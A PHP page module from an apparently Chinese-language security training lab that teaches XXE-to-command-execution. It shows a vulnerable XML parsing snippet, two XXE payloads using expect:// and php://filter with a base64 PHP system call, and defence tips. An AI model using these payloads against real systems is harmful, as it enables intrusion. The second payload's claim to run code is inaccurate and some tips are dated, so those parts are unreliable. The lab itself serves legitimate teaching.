<?php
// XXE RCE漏洞
$module_name = 'XXE RCE';
$module_icon = '💻';
$module_desc = '利用XXE漏洞执行系统命令。';



// 获取宿主机IP
function getHostIP() {
    // 尝试获取服务器IP
    $serverIP = $_SERVER['SERVER_ADDR'];
    
    // 如果是本地环境，返回127.0.0.1
    if ($serverIP === '127.0.0.1' || $serverIP === '::1') {
        return '127.0.0.1';
    }
    
    // 尝试获取网关IP（容器环境）
    $gatewayIP = '';
    if (file_exists('/proc/net/route')) {
        $route = file_get_contents('/proc/net/route');
        preg_match('/^00000000\s+([0-9A-F]{8})/', $route, $matches);
        if (isset($matches[1])) {
            $gatewayIP = long2ip(hexdec($matches[1]));
        }
    }
    
    // 如果获取到网关IP，返回网关IP
    if (!empty($gatewayIP)) {
        return $gatewayIP;
    }
    
    // 默认返回服务器IP
    return $serverIP;
}
$hostIP = gethostbyname(gethostname());
$targetUrl = "http://{$hostIP}:10001";

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">💻 XXE RCE</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示XXE RCE漏洞。<br>
                在某些配置下，攻击者可以通过XXE漏洞执行系统命令，如使用expect://协议或利用其他漏洞。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_POST["xml"])) {
    $xml = $_POST["xml"];
    
    // 漏洞：使用simplexml_load_string解析XML，没有禁用外部实体
    $simplexml = simplexml_load_string($xml);
    if ($simplexml) {
        $result = "XML解析成功：" . print_r($simplexml, true);
    } else {
        $error = "XML解析失败";
    }
}
</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示XXE RCE漏洞，尝试以下攻击：</p>

                    <h5 class="mb-2">1. 使用expect://协议执行命令（需要PHP配置支持）</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "expect://whoami"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">2. 通过PHP协议执行代码</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg=="&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">3. 利用文件上传结合XXE</h5>
                    <p>上传包含XXE payload的XML文件，然后通过文件包含执行</p>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 靶场测试</h6>
                </div>
                <div class="card-body">
                    <div class="text-center py-5">
                        <h5 class="mb-4">XXE RCE 靶场</h5>
                        <p class="mb-5">点击下方按钮跳转到XXE RCE靶场进行实际测试</p>
                        <a href="' . $targetUrl . '" target="_blank" class="btn btn-success btn-lg">
                            <i class="fas fa-play-circle mr-2"></i>前往靶场
                        </a>
                        <p class="mt-3 text-muted">靶场地址：' . $targetUrl . '</p>
                    </div>

                    ';



$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>禁用外部实体：</strong>在XML解析时禁用外部实体</li>
                        <li><strong>使用libxml_disable_entity_loader：</strong>在PHP中使用libxml_disable_entity_loader(true)</li>
                        <li><strong>禁用危险协议：</strong>在PHP配置中禁用expect://等危险协议</li>
                        <li><strong>输入验证：</strong>对XML输入进行严格的验证</li>
                        <li><strong>使用CDATA：</strong>对于用户输入，使用CDATA包裹</li>
                        <li><strong>更新依赖：</strong>确保使用最新版本的XML解析库</li>
                        <li><strong>最小权限原则：</strong>以最小权限运行应用程序</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>